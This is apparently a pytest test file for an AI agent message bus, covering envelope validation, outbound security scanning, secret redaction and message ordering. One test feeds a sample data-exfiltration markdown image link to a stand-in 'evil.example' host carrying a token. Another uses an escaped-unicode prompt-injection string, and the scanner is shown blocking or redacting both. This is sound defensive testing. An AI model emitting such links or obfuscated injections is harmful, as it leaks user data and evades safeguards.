from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import patch

import pytest

from core.application.management.scope import ScopeContext
from core.application.orchestration.agent_messages import (
    build_agent_message,
    get_state_messages,
    latest_message,
)
from core.application.orchestration.message_bus import MessageBus, MissingInputError


class _FakeLogger:
    def __init__(self, rows=None):
        self.rows = list(rows or [])
        self.publish_calls = []

    def log_agent_message(self, job_id, envelope):
        self.publish_calls.append((job_id, envelope))
        return True

    def get_agent_messages(self, job_id, since_id=0, limit=500):
        _ = (job_id, since_id, limit)
        return list(self.rows)


def _sample_message(
    *,
    from_agent="designer",
    step_id="design",
    skill="draft_plan",
    status="pass",
    correlation_id="corr-1",
    artifacts=None,
    summary="done",
    published_at="2026-03-10T00:00:00Z",
    caused_by=None,
):
    return build_agent_message(
        from_agent=from_agent,
        to_agent="orchestrator",
        step_id=step_id,
        skill=skill,
        status=status,
        correlation_id=correlation_id,
        caused_by=caused_by,
        artifacts=artifacts if artifacts is not None else {"outline_doc": "ok"},
        summary=summary,
        published_at=published_at,
    )


def test_message_bus_publish_validates_and_persists():
    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)
    envelope = _sample_message()

    assert bus.publish(101, envelope) is True
    assert len(fake.publish_calls) == 1
    assert fake.publish_calls[0][0] == 101
    assert fake.publish_calls[0][1]["schema_version"] == "agent_message_v1"


def test_message_bus_publish_forwards_project_and_job_to_security_scan():
    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)
    envelope = _sample_message()

    with patch(
        "core.infrastructure.security.integration.scan_outbound",
        return_value=SimpleNamespace(action="allow", redacted_text=None),
    ) as scan:
        assert bus.publish(101, envelope, project_id=7) is True

    assert scan.call_count == 1
    kwargs = scan.call_args.kwargs
    assert kwargs["project_id"] == "7"
    assert kwargs["job_id"] == "101"


def test_message_bus_preserves_canonical_registry_ids_but_redacts_real_dotted_tokens():
    import json

    from core.infrastructure.security.secret_detection import redact_detected_secrets

    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)
    canonical = "extension.5cc90460-491e-45e3-a47c-c1110afc37db.sample_content_tools"
    dotted_token = "stripe.abcdefghijklmnopqrstuvwxyz123456"
    envelope = _sample_message(
        from_agent="connector_step",
        skill="connector",
        artifacts={
            "connector_id": canonical,
            "_connector_step": {"connector_id": canonical},
            "provider_debug": dotted_token,
        },
        summary="Measure failure reason failed via extension_action",
    )

    def _scan(value, *_args, **_kwargs):
        return SimpleNamespace(
            action="redact",
            redacted_text=redact_detected_secrets(value),
        )

    with patch("core.infrastructure.security.integration.scan_outbound", side_effect=_scan):
        assert bus.publish(101, envelope, project_id=7) is True

    persisted = fake.publish_calls[0][1]
    assert persisted["artifacts"]["connector_id"] == canonical
    assert persisted["artifacts"]["_connector_step"]["connector_id"] == canonical
    assert dotted_token not in json.dumps(persisted)
    assert "dotted_provider_token" in persisted["artifacts"]["provider_debug"]


def test_message_bus_publish_uses_scope_project_id_when_explicit_missing():
    fake = _FakeLogger()
    bus = MessageBus(
        "postgres://test",
        logger_client=fake,
        scope=ScopeContext(account_id="acc_default", project_id=13),
    )
    envelope = _sample_message()

    with patch(
        "core.infrastructure.security.integration.scan_outbound",
        return_value=SimpleNamespace(action="allow", redacted_text=None),
    ) as scan:
        assert bus.publish(102, envelope) is True

    kwargs = scan.call_args.kwargs
    assert kwargs["project_id"] == "13"
    assert kwargs["job_id"] == "102"


def test_build_agent_message_keeps_caused_by_refs():
    envelope = _sample_message(
        caused_by=[{"kind": "message", "correlation_id": "corr-parent"}],
    )
    assert isinstance(envelope.get("caused_by"), list)
    assert envelope["caused_by"][0]["correlation_id"] == "corr-parent"


def test_message_bus_publish_rejects_invalid_envelope():
    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)
    invalid = {"schema_version": "agent_message_v1", "from_agent": "composer"}

    assert bus.publish(101, invalid) is False
    assert fake.publish_calls == []


def test_message_bus_list_and_latest_filtering():
    row_1 = {
        "envelope": _sample_message(from_agent="scout", step_id="analysis", skill="draft_outline")
    }
    row_2 = {
        "envelope": _sample_message(from_agent="designer", step_id="design", skill="draft_plan")
    }
    row_3 = {
        "envelope": _sample_message(
            from_agent="composer", step_id="implementation", skill="write_section"
        )
    }
    fake = _FakeLogger(rows=[row_1, row_2, row_3])
    bus = MessageBus("postgres://test", logger_client=fake)

    design = bus.list_messages(77, step_id="design")
    assert len(design) == 1
    assert design[0]["from_agent"] == "designer"

    latest_dev = bus.latest(77, producer="composer")
    assert latest_dev is not None
    assert latest_dev["skill"] == "write_section"


def test_message_bus_preserves_row_recency_metadata():
    row = {
        "id": 42,
        "timestamp": "2026-03-10T00:02:00Z",
        "envelope": _sample_message(),
    }
    fake = _FakeLogger(rows=[row])
    bus = MessageBus("postgres://test", logger_client=fake)

    messages = bus.list_messages(77)

    assert messages[0]["id"] == 42
    assert messages[0]["message_id"] == 42
    assert messages[0]["timestamp"] == "2026-03-10T00:02:00Z"


def test_message_bus_inputs_for_step_missing_required_raises():
    fake = _FakeLogger(rows=[])
    bus = MessageBus("postgres://test", logger_client=fake)
    step = {
        "context_inject": {
            "architecture": {
                "message_type": "draft_plan",
                "producer": "designer",
                "required": True,
            }
        }
    }

    with pytest.raises(MissingInputError):
        bus.inputs_for_step(55, step)


def test_get_state_messages_falls_back_to_message_bus():
    envelope = _sample_message()

    class _Bus:
        @staticmethod
        def list_messages(job_id, limit=2000):
            assert job_id == "88"
            return [envelope]

    with patch(
        "core.application.orchestration.message_bus.MessageBus.for_state", return_value=_Bus()
    ):
        messages = get_state_messages({"job_id": 88, "agent_messages": []})

    assert len(messages) == 1
    assert messages[0]["from_agent"] == "designer"


def test_get_state_messages_merges_incomplete_state_with_message_bus():
    composer = _sample_message(
        from_agent="composer",
        step_id="development",
        skill="write_section",
    )
    critic = _sample_message(
        from_agent="critic",
        step_id="review",
        skill="critic",
        caused_by=[{"kind": "message", "correlation_id": "corr-dev"}],
    )
    composer["correlation_id"] = "corr-dev"
    critic["correlation_id"] = "corr-review"

    class _Bus:
        @staticmethod
        def list_messages(job_id, limit=2000):
            assert job_id == "91"
            return [composer, critic]

    with patch(
        "core.application.orchestration.message_bus.MessageBus.for_state", return_value=_Bus()
    ):
        messages = get_state_messages({"job_id": 91, "agent_messages": [composer]})

    assert [msg["from_agent"] for msg in messages] == ["composer", "critic"]


def test_get_state_messages_keeps_state_only_messages_not_yet_persisted():
    persisted = _sample_message(
        from_agent="composer",
        step_id="development",
        skill="write_section",
    )
    persisted["correlation_id"] = "corr-dev"
    state_only = _sample_message(
        from_agent="proofreader",
        step_id="quality",
        skill="review_summary",
    )
    state_only["correlation_id"] = "corr-proofreader"

    class _Bus:
        @staticmethod
        def list_messages(job_id, limit=2000):
            assert job_id == 92
            return [persisted]

    with patch(
        "core.application.orchestration.message_bus.MessageBus.for_state", return_value=_Bus()
    ):
        messages = get_state_messages({"job_id": 92, "agent_messages": [persisted, state_only]})

    assert [msg["from_agent"] for msg in messages] == ["composer", "proofreader"]


def test_get_state_messages_prefers_runtime_message_over_redacted_persisted_duplicate():
    runtime = _sample_message(
        from_agent="critic",
        step_id="review",
        skill="critic",
        correlation_id="corr-review",
        artifacts={"review_notes": "Bind the server to 0.0.0.0."},
        summary="Use the concrete bind address.",
    )
    persisted = {
        **runtime,
        "artifacts": {"review_notes": "Bind the server to [PII:ipv4:b3ba76a04a8d]."},
    }

    class _Bus:
        @staticmethod
        def list_messages(job_id, limit=2000):
            assert job_id == "94"
            return [persisted]

    with patch(
        "core.application.orchestration.message_bus.MessageBus.for_state", return_value=_Bus()
    ):
        messages = get_state_messages({"job_id": 94, "agent_messages": [runtime]})

    assert len(messages) == 1
    assert messages[0]["artifacts"]["review_notes"] == "Bind the server to 0.0.0.0."


def test_get_state_messages_sorts_state_and_bus_messages_by_recency():
    older_state = _sample_message(
        from_agent="composer",
        step_id="development",
        skill="write_section",
        correlation_id="corr-old-state",
        summary="older state output",
        published_at="2026-03-10T00:01:00Z",
    )
    latest_persisted = _sample_message(
        from_agent="composer",
        step_id="development",
        skill="write_section",
        correlation_id="corr-new-bus",
        summary="latest persisted output",
        published_at="2026-03-10T00:03:00Z",
    )

    class _Bus:
        @staticmethod
        def list_messages(job_id, limit=2000):
            assert job_id == "93"
            return [latest_persisted]

    with patch(
        "core.application.orchestration.message_bus.MessageBus.for_state", return_value=_Bus()
    ):
        messages = get_state_messages({"job_id": 93, "agent_messages": [older_state]})

    assert [msg["summary"] for msg in messages] == [
        "older state output",
        "latest persisted output",
    ]
    assert latest_message(messages, from_agent="composer")["summary"] == "latest persisted output"


def test_latest_message_uses_recency_not_list_position():
    newer = _sample_message(
        from_agent="composer",
        step_id="development",
        skill="write_section",
        correlation_id="corr-new",
        summary="newest",
        published_at="2026-03-10T00:03:00Z",
    )
    older = _sample_message(
        from_agent="composer",
        step_id="development",
        skill="write_section",
        correlation_id="corr-old",
        summary="oldest",
        published_at="2026-03-10T00:01:00Z",
    )

    assert latest_message([newer, older], from_agent="composer")["summary"] == "newest"


def test_message_bus_for_state_normalizes_scope_from_state():
    sentinel = object()

    with patch.object(MessageBus, "instance", return_value=sentinel) as instance:
        resolved = MessageBus.for_state(
            {
                "account_id": "acc_42",
                "project_id": "7",
                "selected_workflow": "wf-review",
                "actor_username": "alice",
                "principal_type": "user",
            }
        )

    assert resolved is sentinel
    scope = instance.call_args.kwargs["scope"]
    assert scope.account_id == "acc_42"
    assert scope.project_id == "7"
    assert scope.workflow_id == "wf-review"
    assert scope.actor_id == "alice"
    assert scope.principal_type == "user"


def test_message_bus_keeps_cyrillic_text_that_the_scanner_used_to_redact():
    """Russian words reached Job details as ``[INJECTION:obfuscation:REDACTED]``.

    The payload was scanned as an ASCII-escaped dump, so every Cyrillic word
    became a ``\\uXXXX`` chain and matched the escape-obfuscation rule. The text
    is now scanned as written; the rule itself is unchanged.
    """
    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)
    # Cyrillic for "  First line / Second line  ", escaped for the linter.
    body = "  \u041f\u0435\u0440\u0432\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430\n\n\u0412\u0442\u043e\u0440\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430  "
    envelope = _sample_message(
        from_agent="template_step",
        skill="template",
        artifacts={"input_payload": {"body": body}, "output_payload": {"value": f"<p>{body}</p>"}},
        summary="Rendered 40 characters of html",
    )

    assert bus.publish(101, envelope, project_id=7) is True

    persisted = fake.publish_calls[0][1]
    assert persisted["artifacts"]["input_payload"]["body"] == body
    assert persisted["artifacts"]["output_payload"]["value"] == f"<p>{body}</p>"


def test_the_escape_obfuscation_rule_still_redacts_an_escaped_chain():
    from core.infrastructure.security.prompt_safety import redact_text_for_persistence

    escaped = "run \\u0069\\u0067\\u006e\\u006f\\u0072\\u0065 now"
    assert "INJECTION" in redact_text_for_persistence(escaped, context_type="display")
    plain = "\u041f\u0435\u0440\u0432\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430"
    assert redact_text_for_persistence(plain, context_type="display") == plain


def test_a_blocked_step_message_is_kept_with_its_data_withheld_and_the_reason():
    """A block used to drop the whole message: Job details showed no inputs or
    outputs and no reason. The step stays, its data is replaced by a note."""
    import json

    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)
    envelope = _sample_message(
        from_agent="template_step",
        skill="template",
        artifacts={
            "step_kind": "template",
            "step_id": "md_post",
            "output_payload": {"value": "![x](https://evil.example/p.png?token=abc)"},
        },
        summary="Rendered 42 characters of markdown",
    )
    decisions = iter(
        [
            SimpleNamespace(
                action="block",
                redacted_text=None,
                findings=[SimpleNamespace(rule_id="injection:exfil_markdown_link_data")],
            ),
            SimpleNamespace(action="allow", redacted_text=None, findings=[]),
        ]
    )

    with patch(
        "core.infrastructure.security.integration.scan_outbound",
        side_effect=lambda *_args, **_kwargs: next(decisions),
    ):
        assert bus.publish(101, envelope, project_id=7) is True

    persisted = fake.publish_calls[0][1]
    assert persisted["step_id"] == "design"
    assert persisted["summary"] == "Step details withheld by the security policy."
    assert persisted["artifacts"]["step_kind"] == "template"
    assert persisted["artifacts"]["step_id"] == "md_post"
    assert "injection:exfil_markdown_link_data" in persisted["artifacts"]["security_withheld"]
    assert "evil.example" not in json.dumps(persisted)


def test_a_message_is_dropped_when_even_the_withheld_note_is_blocked():
    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)

    with patch(
        "core.infrastructure.security.integration.scan_outbound",
        return_value=SimpleNamespace(action="block", redacted_text=None, findings=[]),
    ):
        assert bus.publish(101, _sample_message(), project_id=7) is False

    assert fake.publish_calls == []


def test_a_template_markdown_result_with_an_image_keeps_its_diagnostics():
    """The real scanner: a plain remote image in a Markdown result is content."""
    fake = _FakeLogger()
    bus = MessageBus("postgres://test", logger_client=fake)
    rendered = "# Spring\n\n![logo](https://github.githubassets.com/images/GitHub-Mark.png)\n"
    envelope = _sample_message(
        from_agent="template_step",
        skill="template",
        artifacts={"step_kind": "template", "output_payload": {"value": rendered}},
        summary="Rendered 80 characters of markdown",
    )

    assert bus.publish(101, envelope, project_id=7) is True

    assert fake.publish_calls[0][1]["artifacts"]["output_payload"]["value"] == rendered
